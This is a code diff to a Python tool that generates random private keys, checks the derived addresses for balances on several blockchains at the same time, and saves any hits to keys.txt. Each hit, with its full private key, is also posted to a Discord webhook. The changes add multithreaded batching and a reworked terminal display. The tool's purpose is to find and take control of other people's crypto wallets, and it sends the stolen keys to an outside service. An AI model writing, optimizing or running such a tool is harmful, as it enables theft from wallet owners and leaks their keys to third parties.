@@ -5,6 +5,8 @@ import hashlib
 import json
 from ecdsa import SigningKey, SECP256k1
 from concurrent.futures import ThreadPoolExecutor
+import threading
+import sys
 
 RED = "\033[91m"
 GREEN = "\033[92m"
@@ -32,13 +34,17 @@ BANNER_LINES = [
 
 TERMINAL_WIDTH = 120
 LEFT_COL_WIDTH = 70
-RIGHT_COL_START = LEFT_COL_WIDTH + 2  # column where hits start
+RIGHT_COL_START = LEFT_COL_WIDTH + 2
+MAX_SCAN_LINES = 30  # how many scan lines visible on left
+
+print_lock = threading.Lock()
 
 def print_banner():
-    print(RED)
-    for line in BANNER_LINES:
-        print(line)
-    print(RESET)
+    with print_lock:
+        print(RED)
+        for line in BANNER_LINES:
+            print(line.ljust(TERMINAL_WIDTH))
+        print(RESET)
 
 def generate_private_key():
     return secrets.token_hex(32)
@@ -76,71 +82,104 @@ def send_to_discord(message):
     try:
         requests.post(WEBHOOK_URL, json={"content": message})
     except Exception as e:
-        print(f"Failed to send Discord message: {e}")
+        with print_lock:
+            print(f"Failed to send Discord message: {e}")
 
 def move_cursor(row, col):
     print(f"\033[{row};{col}H", end='')
 
 def clear_screen():
-    print("\033[2J", end='')  # clear screen
-    print("\033[H", end='')   # move cursor home
+    print("\033[2J", end='')
+    print("\033[H", end='')
+
+def clear_left_panel(start_row, lines):
+    for i in range(lines):
+        move_cursor(start_row + i, 1)
+        print(" " * (LEFT_COL_WIDTH - 1))
+
+def clear_right_panel(start_row, lines):
+    for i in range(lines):
+        move_cursor(start_row + i, RIGHT_COL_START)
+        print(" " * (TERMINAL_WIDTH - RIGHT_COL_START))
 
 def main():
     clear_screen()
     print_banner()
     banner_height = len(BANNER_LINES)
-    left_line = banner_height + 1
-    right_line = banner_height + 2
+    left_start = banner_height + 1
+    right_start = banner_height + 1
 
+    scan_lines = []
     found_wallets = []
 
     try:
         while True:
+            batch_keys = []
             for _ in range(10):
                 priv_key = generate_private_key()
                 address = private_key_to_address(priv_key)
+                batch_keys.append((address, priv_key))
 
-                # Left side: scanning log
-                move_cursor(left_line, 1)
-                print(" " * (LEFT_COL_WIDTH - 1), end='')  # clear line
-                print(f"Checking: {address[:40]}...", end='')
-                left_line += 1
-                if left_line > banner_height + 40:
-                    left_line = banner_height + 1
-                    # clear left column block
-                    for clear_line in range(left_line, left_line + 40):
-                        move_cursor(clear_line, 1)
-                        print(" " * (LEFT_COL_WIDTH - 1))
+            # Check balances concurrently
+            with ThreadPoolExecutor(max_workers=len(RPC_ENDPOINTS) * 10) as executor:
+                futures = []
+                for address, priv_key in batch_keys:
+                    for item in RPC_ENDPOINTS.items():
+                        futures.append(executor.submit(check_balance, address, item))
+                results_raw = [f.result() for f in futures]
 
-                # Check balances concurrently
-                with ThreadPoolExecutor(max_workers=len(RPC_ENDPOINTS)) as executor:
-                    futures = [executor.submit(check_balance, address, item) for item in RPC_ENDPOINTS.items()]
-                    results = {f.result()[0]: f.result()[1] for f in futures}
+            # Organize results by address
+            results_by_address = {}
+            idx = 0
+            for address, priv_key in batch_keys:
+                chain_balances = {}
+                for _ in RPC_ENDPOINTS:
+                    chain, bal = results_raw[idx]
+                    chain_balances[chain] = bal
+                    idx += 1
+                results_by_address[address] = (priv_key, chain_balances)
 
-                found = False
-                for bal in results.values():
-                    if bal > 0:
-                        found = True
-                        break
+            # Update scan lines for left panel
+            for address, (priv_key, chain_balances) in results_by_address.items():
+                scan_lines.append(f"Checking: {address[:42]}")
+                if len(scan_lines) > MAX_SCAN_LINES:
+                    scan_lines.pop(0)
 
-                if found:
+            # Clear and redraw left panel
+            clear_left_panel(left_start, MAX_SCAN_LINES)
+            with print_lock:
+                for i, line in enumerate(scan_lines):
+                    move_cursor(left_start + i, 1)
+                    print(line.ljust(LEFT_COL_WIDTH - 1))
+
+            # Check for any wallets with balance > 0
+            new_found = False
+            for address, (priv_key, chain_balances) in results_by_address.items():
+                if any(bal > 0 for bal in chain_balances.values()):
                     found_wallets.append({
                         "address": address,
                         "priv_key": priv_key,
-                        "balances": results,
+                        "balances": chain_balances,
                     })
+                    new_found = True
+                    with open("keys.txt", "a") as f:
+                        f.write(f"{address} : 0x{priv_key}\n")
 
-                    # Clear right side before redraw
-                    for clear_line in range(banner_height + 1, banner_height + 50):
-                        move_cursor(clear_line, RIGHT_COL_START)
-                        print(" " * (TERMINAL_WIDTH - RIGHT_COL_START))
+                    # Send Discord notification
+                    msg = f"💰 **Balance found!**\nAddress: `{address}`\n"
+                    for chain, bal in chain_balances.items():
+                        status = "🟢" if bal > 0 else "🔴"
+                        msg += f"{status} {chain}: {bal:.6f}\n"
+                    msg += f"Private Key: ||0x{priv_key}||"
+                    send_to_discord(msg)
 
-                    # Header for found wallets
-                    move_cursor(banner_height + 1, RIGHT_COL_START)
+            # If new wallets found, redraw right panel
+            if new_found:
+                clear_right_panel(right_start, 40)
+                with print_lock:
+                    move_cursor(right_start, RIGHT_COL_START)
                     print(f"{RED}=== BALANCE FOUND ==={RESET}")
-                    line_num = banner_height + 2
-
-                    # Show last 20 found wallets
+                    line_num = right_start + 1
                     for wallet in found_wallets[-20:]:
                         move_cursor(line_num, RIGHT_COL_START)
                         print(wallet["address"][:42])
@@ -154,20 +193,10 @@ def main():
                         print(f"  PrivKey: 0x{wallet['priv_key'][:10]}...")
                         line_num += 2
 
-                    with open("keys.txt", "a") as f:
-                        f.write(f"{address} : 0x{priv_key}\n")
-
-                    msg = f"💰 **Balance found!**\nAddress: `{address}`\n"
-                    for chain, bal in results.items():
-                        status = "🟢" if bal > 0 else "🔴"
-                        msg += f"{status} {chain}: {bal:.6f}\n"
-                    msg += f"Private Key: ||0x{priv_key}||"
-                    send_to_discord(msg)
-
-            time.sleep(1)
+            time.sleep(0.5)
 
     except KeyboardInterrupt:
-        move_cursor(banner_height + 51, 0)
+        move_cursor(banner_height + MAX_SCAN_LINES + 2, 0)
         print("\nStopped by user.")
 
 if __name__ == "__main__":
